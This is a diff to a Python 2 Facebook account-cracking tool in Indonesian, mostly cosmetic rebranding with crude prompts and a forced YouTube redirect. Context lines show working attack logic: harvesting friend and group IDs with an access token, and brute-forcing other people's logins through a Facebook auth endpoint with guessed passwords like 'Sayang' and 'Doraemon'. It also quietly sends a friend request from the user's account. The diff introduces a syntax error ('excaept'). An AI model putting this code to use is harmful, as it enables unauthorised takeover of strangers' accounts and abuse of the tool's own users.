@@ -46,7 +46,12 @@ def jalan(z):
 		time.sleep(0.05)
 		
 		
-logo = """  \x1b[1;93m______   \x1b[1;92m_______  \x1b[1;94m______    \x1b[1;91m___   _\n \x1b[1;93m|      | \x1b[1;92m|   _   |\x1b[1;94m|    _ |  \x1b[1;91m|   | | |\n \x1b[1;93m|  _    |\x1b[1;92m|  |_|  |\x1b[1;94m|   | ||  \x1b[1;91m|   |_| |\n \x1b[1;93m| | |   |\x1b[1;92m|       |\x1b[1;94m|   |_||_ \x1b[1;91m|      _|\n \x1b[1;93m| |_|   |\x1b[1;92m|       |\x1b[1;94m|    __  |\x1b[1;91m|     |_ \n \x1b[1;93m|       |\x1b[1;92m|   _   |\x1b[1;94m|   |  | |\x1b[1;91m|    _  |\n \x1b[1;93m|______| \x1b[1;92m|__| |__|\x1b[1;94m|___|  |_|\x1b[1;91m|___| |_| \x1b[1;96mFB\n\n \x1b[1;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\n ✫╬─ \x1b[1;92mReCode \x1b[1;91m: \x1b[1;93momalip                   \x1b[1;95m─╬✫\n ✫╬─ \x1b[1;92mFB    \x1b[1;92m \x1b[1;91m: \x1b[1;96mFacebook.com/theomalip     \x1b[1;95m─╬✫\n ✫╬─ \x1b[1;92mGitHub \x1b[1;91m: \x1b[1;94mGithub.com/storiku     \x1b[1;95m─╬✫\n ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
+logo = """ \x1b[1;91m████████
+█▄█████▄█      ●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
+█ ▼▼▼▼▼  _ --_--╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗
+\x1b[1;97m█  _-_-- -_ --__ ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
+█ ▲▲▲▲▲-  - _ --═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ 
+█████████      «°°°°°°°°°°✧°°°°°°°°°°»             ██ ██               ╭∩╮(^_^)╭∩╮ \x1b[1;96mMantan\n\n \x1b[1;97m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\n [■] \x1b[1;92mGithub \x1b[1;91m: \x1b[1;95m.....                   \x1b[1;95m[■]\n [■] \x1b[1;92mWA    \x1b[1;92m \x1b[1;91m: \x1b[1;95m...     \x1b[1;95m[■]\n [■] \x1b[1;92mHai \x1b[1;91m: \x1b[1;93mMembuat tidak semudah menggunakan     \x1b[1;97m●\n ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
 """
 
 def tik():
@@ -67,25 +72,26 @@ vuln = "\033[32mVuln"
 
 def siapa():
 	os.system('clear')
-	nama = raw_input("\033[1;97mSiapa nama kamu ? \033[1;91m: \033[1;92m")
+	nama = raw_input("\033[1;97mMasuakan nama pacar lu kalau ga punya pacar mati aja lu haha? \033[1;91m: \033[1;92m")
 	if nama =="":
-		print"\033[1;96m[!] \033[1;91mIsi yang benar"
+		print"\033[1;96m[!] \033[1;91mIsian ka bnr"
 		time.sleep(1)
 		siapa()
 	else:
 		os.system('clear')
-		jalan("\033[1;97mSelamat datang \033[1;92m" +nama+ "\n\033[1;97mTerimakasih telah menggunakan tools ini !!")
+		jalan("\033[1;91mSelamat datang \033[1;92m" +nama+ "\n\033[1;97mTerimakasih telah menggunakan tools ini Jangan lupa subscribe chanel yt gw!!")
 		time.sleep(1)
 		loginSC()
 		
 		
 def loginSC():
 	os.system('clear')
-	print"\033[1;97mSilahkan login SC nya dulu bosque\n"
+	jalan("\033[1;93mSilahkan login script nya dulu sia jangan bilang script ini ga work atau apa lu nya aja yang gk bisa memmbuat tidak semudah menggunakan,Jangan di jual belikan Bangsat.Agar nanti akun fb sia tidak terkena checkpoint login opera mini dulu/buat fb baru \n")
 	username = raw_input("\033[1;96m[*] \033[1;97mUsername \033[1;91m: \033[1;92m")
 	password = raw_input("\033[1;96m[*] \033[1;97mPassword \033[1;91m: \033[1;92m")
-	if username =="dark" and password =="fb":
-		print"\033[1;96m[✓] \033[1;92mLogin success"
+	if username =="Subscribe" and password =="Dulu bos":
+		print"\033[1;96m[✓] \033[1;93mLogin Berhasil"
+                os.system('xdg-open https://www.youtube.com/channel/UCxLFXgxj_U1SMlpK0cJ5KZw ')
 		time.sleep(1)
 		login()
 	else:
@@ -98,10 +104,11 @@ def login():
 	try:
 		toket = open('login.txt','r')
 		menu() 
-	except (KeyError,IOError):
+	excaept (KeyError,IOError):
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
+                print('\033[1;96mJika loginya berhasil kalian \x1b[1;93mAkan di arahkan ke youtube \x1b[1;96mDan lu harus subscribe dulu' )
 		print('\033[1;96m[☆] \x1b[1;93mLOGIN AKUN FACEBOOK ANDA \x1b[1;96m[☆]' )
 		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
 		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
@@ -133,13 +140,13 @@ def login():
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				os.system('xdg-open https://www.youtube.com/omaliptv')
+				os.system('xdg-open https://www.youtube.com/channel/UCxLFXgxj_U1SMlpK0cJ5KZw ')
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\033[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint")
+			print("\n\033[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint puas")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
@@ -180,16 +187,16 @@ def menu():
 	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Nama \033[1;91m: \033[1;92m"+nama+"\033[1;97m                  "
 	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
 	print 42*"\033[1;96m="
-	print "\x1b[1;97m1.\x1b[1;93m Hack facebook MBF"
-	print "\x1b[1;97m2.\x1b[1;93m Lihat daftar grup               "
-	print "\x1b[1;97m3.\x1b[1;93m Informasi akun               "
-	print "\x1b[1;97m4.\x1b[1;93m Yahoo clone               "
-	print "\n\x1b[1;91m0.\x1b[1;91m Logout            "
+	print "\x1b[1;97m1.\x1b[1;91m Háćķ âķûń fâćébôóķ              "
+	print "\x1b[1;97m2.\x1b[1;91m Łíháť đáfťāř ğřüp               "
+	print "\x1b[1;97m3.\x1b[1;97m ļňfőřmāśí āķůń              "
+	print "\x1b[1;97m4.\x1b[1;97m Ýăhøø ćļøńë               "
+	print "\n\x1b[1;91m0.\x1b[1;94m Ķāļûąř            "
 	pilih()
 
 
 def pilih():
-	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
+	unikers = raw_input("\n\033[1;96m---->  \033[1;97m")
 	if unikers =="":
 		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
 		pilih()
@@ -224,15 +231,15 @@ def super():
 	os.system('clear')
 	print logo
 	print 42*"\033[1;96m="
-	print "\x1b[1;97m1.\x1b[1;93m Crack dari daftar teman"
-	print "\x1b[1;97m2.\x1b[1;93m Crack dari teman"
-	print "\x1b[1;97m3.\x1b[1;93m Crack dari member grup"
-	print "\x1b[1;97m4.\x1b[1;93m Crack dari file"
-	print "\n\x1b[1;91m0.\x1b[1;91m Kembali"
+	print "\x1b[1;97m1.\x1b[1;91m Ćřâćķ đâřį đâfťāř țêmåń ļů"
+	print "\x1b[1;97m2.\x1b[1;91m Čřàçķ ťémâń đãří ťęmāń ĺu"
+	print "\x1b[1;97m3.\x1b[1;97m Çŕàçķ đàŕì mémbéř ģŕùp"
+	print "\x1b[1;97m4.\x1b[1;97m Ćřáçķ đãří fïľé"
+	print "\n\x1b[1;91m0.\x1b[1;93m Báćķ"
 	pilih_super()
 
 def pilih_super():
-	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
+	peak = raw_input("\n\033[1;97m ----> \033[1;97m")
 	if peak =="":
 		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
 		pilih_super()
@@ -240,7 +247,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
+		jalan('\033[1;96m[✺] \033[1;91mMengambil ID \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
@@ -249,16 +256,16 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		idt = raw_input("\033[1;96m[+] \033[1;93mMasukan ID teman \033[1;91m: \033[1;97m")
+		idt = raw_input("\033[1;96m[+] \033[1;91mMasukan ID teman \033[1;91m: \033[1;97m")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama teman\033[1;91m :\033[1;97m "+op["name"]
+			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;91mNama teman\033[1;91m :\033[1;97m "+op["name"]
 		except KeyError:
 			print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan!"
 			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
 			super()
-		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
+		jalan('\033[1;96m[✺] \033[1;91mMengambil ID \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -304,7 +311,7 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print
-	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
+	print('\x1b[1;96m[!] \x1b[1;91mSabar bos jangan banyak bacot')
 	print 42*"\033[1;96m="
 	
 			
@@ -398,7 +405,7 @@ def pilih_super():
 											cek.close()
 											cekpoint.append(user+pass4)
 										else:
-											birthday = b['birthday']
+											birthday = 'Sayang'
 											pass5 = birthday.replace('/', '')
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
@@ -419,7 +426,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = 'Sayang'
+													pass6 = 'Doraemon'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
